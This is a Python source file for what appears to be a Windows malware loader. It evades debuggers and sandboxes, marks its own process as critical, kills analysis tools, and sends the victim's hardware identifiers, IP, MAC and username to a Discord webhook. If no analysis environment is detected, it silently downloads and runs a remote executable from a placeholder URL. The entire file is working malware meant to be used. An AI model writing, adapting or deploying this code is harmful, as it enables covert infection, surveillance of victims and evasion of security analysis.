from datetime import datetime
import winreg
import psutil
import re
import uuid
import wmi
import requests
## ANTI DEBUGGING
from AntiDebug.CheckBlacklistedWindowsNames import CheckTitles
from AntiDebug.CheckInternetConnection import check_connection
from AntiDebug.IsDebuggerPresent import is_debugger_present
from AntiDebug.RemoteDebugger import CheckRemoteDebugger
from AntiDebug.KillBadProcesses import KillBadProcesses
from AntiDebug.ParentAntiDebug import ParentAntiDebug
from AntiDebug.ComputerUptime import CheckUptime
## ANTI VIRTULIZATION
from AntiVirtulization.TriageCheck import TriageCheck
from AntiVirtulization.USBCheck import PluggedIn
from AntiVirtulization.UsernameCheck import CheckForBlacklistedNames
from AntiVirtulization.VMArtifacts import VMArtifactsDetect
from AntiVirtulization.VMWareDetection import GraphicsCardCheck as VMWareGraphicsCardCheck
from AntiVirtulization.VirtualboxDetection import GraphicsCardCheck as VirtualboxGraphicsCardCheck
from AntiVirtulization.QEMUCheck import CheckForQEMU
from AntiVirtulization.ParallelsCheck import CheckForParallels
from AntiVirtulization.MonitorMetrics import IsScreenSmall
from AntiVirtulization.KVMCheck import CheckForKVM
from AntiVirtulization.RecentFileActivity import RecentFileActivityCheck

## Program Utilities
from CriticalProcess.SetProcessIsCritical import set_process_critical
import urllib.request
import subprocess
import os
import tempfile


webhook_url = "REPLACE"
file_url = "REPLACE"


def anti_vt_checks():
    def pcdetect():
        # Send PC info to Discord webhook
        message = f"""```yaml\n![PC DETECTED]!  \nPC Name: {pc_name}\nPC Username: {serveruser}\nHWID: {hwid}\nIP: {ip}\nMAC: {mac}\nPLATFORM: {os_name}\nCPU: {computer.Win32_Processor()[0].Name}\nRAM: {str(round(psutil.virtual_memory().total / (1024.0 ** 3)))} GB\nGPU: {gpu}\nBiosSerial: {current_bios_serial}\nBaseBoardManufacturer: {current_baseboard_manufacturer}\nBaseBoardSerial: {current_bios_serial}\nCPUSerial: {current_cpu_serial}\nDiskDriveSerial: {current_diskdrive_serial}\nHWProfileGUID: {hwguid}\nMachineGUID: {get_guid()}\nTIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""
        data = {"content": message}
        try:
            requests.post(webhook_url, json=data)
        except Exception as e:
            print(f"Failed to send PC info to Discord: {e}")
    # --- Begin anti_vt logic ---
    def getip():
        ip = "None"
        try:
            ip = requests.get("https://api.ipify.org").text
        except:
            pass
        return ip

    def get_guid():
        try:
            reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
            key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\\Microsoft\\Cryptography")
            return winreg.QueryValueEx(key_value, "MachineGuid")[0]
        except Exception as e:
            return None

    def get_hwguid():
        try:
            reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
            key_value = winreg.OpenKey(reg_connection, r"SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001")
            return winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
        except Exception as e:
            return None

    def run_wmic(cmd):
        startupinfo = None
        creationflags = 0
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            creationflags = subprocess.CREATE_NO_WINDOW
        return subprocess.check_output(cmd, startupinfo=startupinfo, creationflags=creationflags).decode().split('\n')[1].strip()

    ip = getip()
    serveruser = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    computer = wmi.WMI()
    os_info = computer.Win32_OperatingSystem()[0]
    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
    os_name = f'{os_name}'.replace('b', ' ').replace("'", " ")
    gpu = computer.Win32_VideoController()[0].Name
    hwid = run_wmic('wmic csproduct get uuid')
    current_baseboard_manufacturer = run_wmic('wmic baseboard get manufacturer')
    current_diskdrive_serial = run_wmic('wmic diskdrive get serialnumber')
    current_cpu_serial = run_wmic('wmic cpu get serialnumber')
    current_bios_serial = run_wmic('wmic bios get serialnumber')
    current_baseboard_serial = run_wmic('wmic baseboard get serialnumber')
    hwguid = f'{get_hwguid()}'.replace('{', ' ').replace('}', ' ')

    # Download lists
    def get_list(url):
        try:
            return requests.get(url).text
        except:
            return ""

    hwidlist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
    pcnamelist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
    pcusernamelist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
    iplist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
    maclist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
    gpulist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
    diskdriveserial_list = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
    cpuserial_list = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
    baseboardmanufacturerlist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
    bios_serial_list = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
    baseboardserial_list = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
    machineguidlist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
    hwprofileguidlist = get_list('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')

    # Send PC info first
    pcdetect()
    # Check for abnormalities
    abnormalities = []
    if hwid in hwidlist:
        abnormalities.append(f"Blacklisted HWID: {hwid}")
    if serveruser in pcusernamelist:
        abnormalities.append(f"Blacklisted PC User: {serveruser}")
    if pc_name in pcnamelist:
        abnormalities.append(f"Blacklisted PC Name: {pc_name}")
    if ip in iplist:
        abnormalities.append(f"Blacklisted IP: {ip}")
    if mac in maclist:
        abnormalities.append(f"Blacklisted MAC: {mac}")
    if gpu in gpulist:
        abnormalities.append(f"Blacklisted GPU: {gpu}")
    if current_diskdrive_serial in diskdriveserial_list:
        abnormalities.append(f"Blacklisted DiskDriveSerial: {current_diskdrive_serial}")
    if current_cpu_serial in cpuserial_list:
        abnormalities.append(f"Blacklisted CPUSerial: {current_cpu_serial}")
    if current_baseboard_manufacturer in baseboardmanufacturerlist:
        abnormalities.append(f"Blacklisted BaseBoardManufacturer: {current_baseboard_manufacturer}")
    if current_bios_serial in bios_serial_list:
        abnormalities.append(f"Blacklisted BiosSerial: {current_bios_serial}")
    if current_baseboard_serial in baseboardserial_list:
        abnormalities.append(f"Blacklisted BaseBoardSerial: {current_baseboard_serial}")
    if get_guid() in machineguidlist:
        abnormalities.append(f"Blacklisted MachineGUID: {get_guid()}")
    if hwguid in hwprofileguidlist:
        abnormalities.append(f"Blacklisted MachineHWGUID: {hwguid}")
    return abnormalities

def download_and_execute(url):
    if not url:
        return

    try:
        tmp_dir = tempfile.gettempdir()
        filename = os.path.basename(url)
        if not filename:
            filename = "downloaded_file.exe"

        filepath = os.path.join(tmp_dir, filename)

        urllib.request.urlretrieve(url, filepath)

        if os.name == 'nt':
            creation_flags = subprocess.CREATE_NO_WINDOW
            subprocess.run(filepath, shell=True, creationflags=creation_flags)
        else:
            # On non-windows, we don't have this flag.
            # The shell=True is also a potential security risk.
            # A better implementation would use a list of args.
            subprocess.run(filepath, shell=True)

    except Exception as e:
        # Fail silently in the compiled version.
        pass

def run_checks():
    detections = []

    if TriageCheck(): detections.append("Triage")
    if RecentFileActivityCheck()[0]: detections.append("Recent File Activity")
    if PluggedIn(): detections.append("No USBs")
    if CheckForBlacklistedNames(): detections.append("Blacklisted Username")
    if VMArtifactsDetect(): detections.append("VM Artifacts")
    if VMWareGraphicsCardCheck(): detections.append("VMware Graphics Card")
    if VirtualboxGraphicsCardCheck(): detections.append("VirtualBox Graphics Card")
    if CheckForQEMU()[0]: detections.append("QEMU")
    if CheckForParallels()[0]: detections.append("Parallels")
    if IsScreenSmall()[0]: detections.append("Small Screen")
    if CheckForKVM()[0]: detections.append("KVM")
    #if CheckTitles(): detections.append("Blacklisted Window Title")
    if not check_connection()[0]: detections.append("No Internet")
    if is_debugger_present(): detections.append("Debugger Present")
    if CheckRemoteDebugger(): detections.append("Remote Debugger")
    #if ParentAntiDebug(): detections.append("Non-standard Parent Process")
    if CheckUptime(1200)[0]: detections.append("Uptime < 20 mins")

    return detections

def main():
    set_process_critical()
    detections = run_checks()
    KillBadProcesses()

    # Run anti_vt checks
    abnormalities = anti_vt_checks()

    # Send both results to Discord webhook

    def send_to_discord_webhook(webhook_url, detections, abnormalities):
        if not webhook_url:
            return
        message = "Detections: " + (", ".join(detections) if detections else "None")
        message += "\nAntiVT Abnormalities: " + (", ".join(abnormalities) if abnormalities else "None")
        data = {"content": message}
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204 or response.status_code == 200:
                print("Detection list sent to Discord webhook.")
            else:
                print(f"Failed to send detection list: {response.status_code}")
        except Exception as e:
            print(f"Failed to send to Discord: {e}")

    send_to_discord_webhook(webhook_url, detections, abnormalities)

    # Only download if both lists are empty
    if not detections and not abnormalities:
        
        download_and_execute(file_url)

if __name__ == "__main__":
    main()
